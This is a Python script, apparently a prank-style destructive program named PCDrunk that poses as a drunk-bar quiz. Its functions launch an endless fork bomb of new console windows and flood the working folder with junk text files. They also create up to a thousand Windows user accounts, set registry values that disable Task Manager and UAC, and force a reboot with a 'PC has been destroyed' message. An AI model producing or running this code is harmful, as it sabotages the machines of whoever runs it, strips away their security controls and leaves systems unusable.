import random
import time
import os
import subprocess, sys


colors = "COLORS CAFE' : [[[[Black: 10 Files, Red: 50 Files, Green: 100 Files, Orange: 200 Files, Yellow: 1000 Files]]]]"


def crash():
    i = 0
    while i <= 10:
         subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
         print("Enjoy you're rest :D")

def UltimateDestroy():
    for _ in range(1000):
        os.system("net user con" + str(random.randint(0, int(1000))) + " /add")
    os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
    os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v SCEnableAutomaticRestart /t REG_DWORD /d 0 /f")
    os.system("reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
    os.system("reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v RemoteRegistryExactPaths /t REG_DWORD /d 0 /f")
    os.system("reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v RemoteRegistryPaths /t REG_DWORD /d 0 /f")
    os.system("reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableProcessPrivilegeEscalation /t REG_DWORD /d 0 /f")
    os.system("shutdown /r /t 60 /c \"PC has been destroyed by PCDrunk\"")
    gdi()

def gdi():
    from gdi.squares import main
    i = 0
    while i <= 10:
         main()

def destroy():
    print(colors)
    color = input("Say you're favourite color >> ")

    if color == "Black":
        for _ in range(10):
            PCDrunkTXT = open(
                "PCDrunk" + str(random.randint(0, int(10))) + ".txt", "w+")

    if color == "Red":
        for _ in range(50):
            PCDrunkTXT = open(
                "PCDrunk" + str(random.randint(0, int(50))) + ".txt", "w+")

    if color == "Green":
        for _ in range(100):
            PCDrunkTXT = open(
                "PCDrunk" + str(random.randint(0, int(100))) + ".txt", "w+")

    if color == "Orange":
        for _ in range(200):
            PCDrunkTXT = open(
                "PCDrunk" + str(random.randint(0, int(200))) + ".txt", "w+")

    if color == "Yellow":
        for _ in range(1000):
            PCDrunkTXT = open(
                "PCDrunk" + str(random.randint(0, int(1000))) + ".txt", "w+")

    selection = input(
        "Now choose: Crash your pc or Destory your pc (Crash\Destroy) >> ")

    if selection == "Crash":
        crash()

    if selection == "Destroy":
        UltimateDestroy()


drunk = input("You're in a bar and you are drunk. Are You Drunk? (Y/N) >> ")

if drunk == "Y":
    print("You need rest.")
    time.sleep(1.5)
    print("First off i'mma destroy your computer to not get distracted.")
    time.sleep(2)
    destroy()
else:
    print("Noice.")
    time.sleep(2)
